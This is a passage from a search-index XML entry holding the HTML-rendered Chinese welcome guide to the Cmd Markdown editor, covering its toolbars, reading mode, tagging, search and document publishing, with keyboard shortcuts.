<strong>管理工具栏</strong>：<br><br><img src="https://www.zybuluo.com/static/img/toolbar-manager.jpg" alt="tool-manager"><br><br>通过管理工具栏可以：<br><br><i class="icon-share"></i> 发布：将当前的文稿生成固定链接，在网络上发布，分享<br><i class="icon-file"></i> 新建：开始撰写一篇新的文稿<br><i class="icon-trash"></i> 删除：删除当前的文稿<br><i class="icon-cloud"></i> 导出：将当前的文稿转化为 Markdown 文本或者 Html 格式，并导出到本地<br><i class="icon-reorder"></i> 列表：所有新增和过往的文稿都可以在这里查看、操作<br><i class="icon-pencil"></i> 模式：切换 普通&#x2F;Vim&#x2F;Emacs 编辑模式<br><br>### 7. 阅读工具栏<br><br><img src="https://www.zybuluo.com/static/img/toolbar-reader.jpg" alt="tool-manager"><br><br>通过 <strong>预览区</strong> 右上角的 <strong>阅读工具栏</strong>，可以查看当前文稿的目录并增强阅读体验。<br><br>工具栏上的五个图标依次为：<br><br><i class="icon-list"></i> 目录：快速导航当前文稿的目录结构以跳转到感兴趣的段落<br><i class="icon-chevron-sign-left"></i> 视图：互换左边编辑区和右边预览区的位置<br><i class="icon-adjust"></i> 主题：内置了黑白两种模式的主题，试试 <strong>黑色主题</strong>，超炫！<br><i class="icon-desktop"></i> 阅读：心无旁骛的阅读模式提供超一流的阅读体验<br><i class="icon-fullscreen"></i> 全屏：简洁，简洁，再简洁，一个完全沉浸式的写作和阅读环境<br><br>### 8. 阅读模式<br><br>在 <strong>阅读工具栏</strong> 点击 <i class="icon-desktop"></i> 或者按下 <code>Ctrl+Alt+M</code> 随即进入独立的阅读模式界面，我们在版面渲染上的每一个细节：字体，字号，行间距，前背景色都倾注了大量的时间，努力提升阅读的体验和品质。<br><br>### 9. 标签、分类和搜索<br><br>在编辑区任意行首位置输入以下格式的文字可以标签当前文档：<br><br>标签： 未分类<br><br>标签以后的文稿在【文件列表】（Ctrl+Alt+F）里会按照标签分类，用户可以同时使用键盘或者鼠标浏览查看，或者在【文件列表】的搜索文本框内搜索标题关键字过滤文稿，如下图所示：<br><br><img src="https://www.zybuluo.com/static/img/file-list.png" alt="file-list"><br><br>### 10. 文稿发布和分享<br><br>在您使用 Cmd Markdown 记录，创作，整理，阅读文稿的同时，我们不仅希望它是一个有力的工具，更希望您的思想和知识通过这个平台，连同优质的阅读体验，将他们分享给有相同志趣的人，进而鼓励更多的人来到这里记录分享他们的思想和知识，尝试点击 <i class="icon-share"></i> (Ctrl+Alt+P) 发布这份文档给好友吧！
 </h2><p>再一次感谢您花费时间阅读这份欢迎稿，点击 <i class="icon-file"></i> (Ctrl+Alt+N) 开始撰写新的文稿吧！祝您在这里记录、阅读、分享愉快！</p>
<p>作者 <a href="http://weibo.com/ghosert">@ghosert</a><br>2016 年 07月 07日    </p>
<p>[^LaTeX]: 支持 <strong>LaTeX</strong> 编辑显示支持，例如：$\sum_{i&#x3D;1}^n a_i&#x3D;0$， 访问 <a href="http://meta.math.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference">MathJax</a> 参考更多使用方法。</p>
<p>[^code]: 代码高亮功能支持包括 Java, Python, JavaScript 在内的，<strong>四十一</strong>种主流编程语言。</p>
]]></content>
      <tags>
        <tag>Md</tag>
      </tags>
  </entry>
</search>
